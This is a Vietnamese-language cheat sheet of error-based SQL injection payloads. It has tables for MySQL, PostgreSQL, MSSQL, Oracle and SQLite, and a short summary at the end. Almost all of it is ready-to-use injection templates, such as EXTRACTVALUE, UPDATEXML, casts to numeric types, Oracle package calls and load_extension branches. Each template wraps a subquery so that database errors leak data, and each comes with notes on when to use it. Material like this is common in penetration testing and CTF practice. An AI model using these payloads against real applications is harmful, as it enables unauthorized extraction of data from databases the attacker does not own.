# SQLi Error-Based Cheatsheet

## Table of Contents
- [MySQL](#mysql)
- [PostgreSQL](#postgresql)
- [MSSQL](#mssql)
- [Oracle](#oracle)
- [SQLite](#sqlite)

---

## MySQL

> Marker hay dùng: `CONCAT('~', data, '~')`

| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
|---|---|---|---|
| `EXTRACTVALUE(xml, xpath)` | Làm XPath lỗi để lỗi hiện dữ liệu | `EXTRACTVALUE(1, (<subquery>))` | Có XML function |
| `UPDATEXML(xml_target, xpath_expr, new_xml)` | Tương tự `EXTRACTVALUE`, lỗi XPath | `UPDATEXML(1, (<subquery>), 1)` | Có XML function |
| `GTID_SUBSET(gtid_set1, gtid_set2)` | Đưa GTID sai format để lỗi parse hiện dữ liệu | `GTID_SUBSET((<subquery>), 1)` | Có GTID function |
| `JSON_KEYS(json_doc)` | Đưa dữ liệu không phải JSON để lỗi parse JSON | `JSON_KEYS((<subquery>))` | Có JSON function |
| `NAME_CONST(name, value)` | Tạo 2 cột trùng tên để ra duplicate column error | `SELECT NAME_CONST((<subquery>),1), NAME_CONST((<subquery>),1)` | Cần lỗi duplicate column |
| `FLOOR(RAND()) + GROUP BY` | Tạo key bị trùng để ra duplicate entry error | `SELECT COUNT(*), CONCAT('~',(<subquery>),'~',FLOOR(RAND(0)*2)) x FROM ... GROUP BY x` | Cần duplicate entry |
| `EXP(expr)` | Ép dữ liệu vào ngữ cảnh số học để gây lỗi cast/overflow | `EXP(~(<subquery>))` | Muốn thử numeric error |
| `UUID_TO_BIN(string_uuid)` | Đưa dữ liệu không phải UUID để lỗi parse | `UUID_TO_BIN((<subquery>))` | Có UUID function |

---

## PostgreSQL

> Marker hay dùng: `'~'||data||'~'`

| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
|---|---|---|---|
| `CAST(expr AS type)` | Ép chuỗi sang số để báo lỗi conversion | `CAST((<subquery>) AS NUMERIC)` | Cơ bản, dễ dùng |
| `expr::type` | Viết tắt của cast, cùng cơ chế | `(<subquery>)::NUMERIC` | Payload ngắn |
| `query_to_xml(query, nulls, tableforest, targetns)` + `CAST` | Gom nhiều dòng thành XML rồi ép kiểu để lỗi | `CAST(query_to_xml('<query>',true,true,'') AS NUMERIC)` | Muốn leak nhiều dòng |
| `database_to_xml(nulls, tableforest, targetns)` + `CAST` | Dump DB thành XML rồi ép kiểu để lỗi | `CAST(database_to_xml(true,true,'') AS NUMERIC)` | Muốn gom nhiều dữ liệu |

---

## MSSQL

> Marker hay dùng: `'~'+data+'~'`

| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
|---|---|---|---|
| `CONVERT(data_type, expression)` | Ép chuỗi sang số để ra conversion error | `CONVERT(INT, (<subquery>))` | Cơ bản, dễ dùng |
| `CAST(expression AS data_type)` | Tương tự `CONVERT` | `CAST((<subquery>) AS INT)` | Payload ngắn |
| `IN (subquery / value list)` | So sánh số với chuỗi để SQL Server tự ép kiểu và lỗi | `1337 IN (SELECT (<subquery>))` | Injection nằm trong điều kiện |
| `=` | So sánh số với chuỗi để sinh conversion error | `1337 = (<subquery>)` | Injection nằm trong điều kiện |

---

## Oracle

> Khi injection nằm trong string: `'||PAYLOAD--`  
> Marker hay dùng: `CHR(126)` hoặc `'||'~'||data||'~'||'`

| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
|---|---|---|---|
| `UTL_INADDR.GET_HOST_NAME(ip_address)` | Đưa dữ liệu sai vào host lookup để lỗi hiện dữ liệu | `UTL_INADDR.GET_HOST_NAME((<subquery>))` | Có quyền gọi package |
| `CTXSYS.DRITHSX.SN(owner, text)` | Lợi dụng lỗi từ Oracle Text | `CTXSYS.DRITHSX.SN(USER, (<subquery>))` | Có Oracle Text |
| `ORDSYS.ORD_DICOM.GETMAPPINGXPATH(input, arg1, arg2)` | Đưa dữ liệu vào ngữ cảnh XPath để gây lỗi | `ORDSYS.ORD_DICOM.GETMAPPINGXPATH((<subquery>), USER, USER)` | Có package ORDSYS |
| `CAST(expr AS type)` | Ép chuỗi sang số để gây conversion error | `CAST((<subquery>) AS NUMBER)` | Cơ bản, dễ hiểu |
| `XDBURITYPE(value).getBlob()` | Lợi dụng lỗi URI/XML DB | `XDBURITYPE((<subquery>)).getBlob()` | Có XML DB |
| `XDBURITYPE(value).getClob()` | Tương tự `getBlob()` | `XDBURITYPE((<subquery>)).getClob()` | Có XML DB |
| `XMLType(expr)` | Tạo XML lỗi để parse error hiện dữ liệu | `XMLType((<subquery>))` | Có XML parser |
| `DBMS_UTILITY.SQLID_TO_SQLHASH(value)` | Đưa giá trị sai format để lỗi validation | `DBMS_UTILITY.SQLID_TO_SQLHASH((<subquery>))` | Có quyền gọi package |

---

## SQLite

| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
|---|---|---|---|
| `load_extension(path)` | Dùng nhánh lỗi để phân biệt đúng/sai | `CASE WHEN (<boolean_query>) THEN 1 ELSE load_extension(1) END` | Chủ yếu là conditional error |

---

## Ghi nhớ nhanh

| DBMS | Cơ chế chính |
|---|---|
| MySQL | XPath error, parser error, duplicate error |
| PostgreSQL | Cast/type conversion error |
| MSSQL | Cast/conversion error, comparison-triggered conversion |
| Oracle | Package error, XML error, cast error |
| SQLite | Conditional error qua `load_extension()` |